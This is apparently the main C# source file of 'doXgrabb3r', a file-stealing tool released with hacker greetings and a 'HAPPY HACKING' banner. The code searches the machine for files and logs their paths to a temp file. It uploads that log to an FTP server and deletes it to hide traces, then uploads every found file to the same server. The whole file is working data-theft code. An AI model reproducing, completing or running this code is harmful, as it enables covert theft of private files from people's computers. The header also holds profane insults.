using System;
using System.Collections.Generic;

/*

    .___    ____  ___                   ___.  ___.   ________        
  __| _/____\   \/  /  ________________ \_ |__\_ |__ \_____  \______ 
 / __ |/  _ \\     /  / ___\_  __ \__  \ | __ \| __ \  _(__  <_  __ \
/ /_/ (  <_> )     \ / /_/  >  | \// __ \| \_\ \ \_\ \/       \  | \/
\____ |\____/___/\  \\___  /|__|  (____  /___  /___  /______  /__|   
     \/           \_/_____/            \/    \/    \/       \/       

*/

//
// <author>
//     <value>Jahanzaib Khan Durrani</value>
// </author>
//
// <CyberName>
//     <value>MAGniFic0</value>
//     <value>...</value>
// </CyberName>
//
// <greetings>
//     <value>Mr. P.Teo</value>
//     <value>VirKid36</value>
//     <value>Mr. Exploit</value>
//     <value>X HaxOr</value>
//     <value>Mr. Anon</value>
//     <value>Code Breaker</value>
//     <value>5IL3NT H4CK3R</value>
//     <value>HaxOr Hees</value>
// </greetings>
//
// <fucksTo>
//     <value>Idea Stealer 1</value>
//     <value>Idea Stealer 2</value>
//     <value>Idea Stealer 3</value>
//     <desc>PM IF YOU WANT THE NAMES. Yes, Yes, You know them as 1337s (Self Branding MotherFuckers!) ;)</desc>
// </fucksTo>
//
// For signing the assembly refer to :
// https://msdn.microsoft.com/en-us/library/6f05ezxy(v=vs.110).aspx 
//
/*           HAPPY HACKING :)            */



namespace doXgrabb3r
{
    class Program
    {
        static void Main(string[] args)
        {

			/****************** VARIABLES AND CONFIG *****************/
	                               
            Random rnd = new Random();
            int myRND = rnd.Next(1000, 9900);
            FTP ftp = new FTP("ftp://192.168.1.1/", "User", "Pass", myRND); // FTP URL , USERNAME , PASSWORD , Leave The PARAM
            FileArrayBuilder fab = new FileArrayBuilder();
			List<string> files = null;




			/****************** Search Required Files *****************/

            try {

				Console.WriteLine("Searching....");
				files = fab.Search();
				fab.clear_ram();
				GC.Collect();
				Console.WriteLine("Complete...");

			} catch (Exception @r) { Console.WriteLine(r.Message); }




			/****************** Log The Files *****************/

			try {
				
				Console.WriteLine("Writing....");
				System.IO.File.WriteAllLines(System.IO.Path.GetTempPath() + myRND + "_file.datx", files.ToArray());
				Console.WriteLine("Complete...");

			} catch (Exception @r) { Console.WriteLine(r.Message); }
            

            try {
				
				Console.WriteLine("Uploading LOG...");
				ftp.ftp_upload(System.IO.Path.GetTempPath() + myRND + "_file.datx"); 
				Console.WriteLine("Complete...");

			} catch (Exception @r) { Console.WriteLine(r.Message); }

            
			try { 
				
				Console.WriteLine("Wiping LOG...");
				System.IO.File.Delete(System.IO.Path.GetTempPath() + myRND + "_file.datx"); 
				Console.WriteLine("Complete...");

			} catch (Exception @r) { Console.WriteLine(r.Message); }
            



			/****************** Upload The Files Via FTP *****************/

            Console.WriteLine("File Upload started...\n");
            foreach (string file in files) {
                
                try { 
					
					Console.WriteLine("Uploading: " + System.IO.Path.GetFileName(file));
					ftp.ftp_upload(file); 
					Console.WriteLine("Uploaded: " + System.IO.Path.GetFileName(file));

				} catch (Exception @r) { Console.WriteLine(r.Message); }
               
            }
            Console.WriteLine("\nALL Complete...");

            //Console.ReadKey();
        }


    }
}
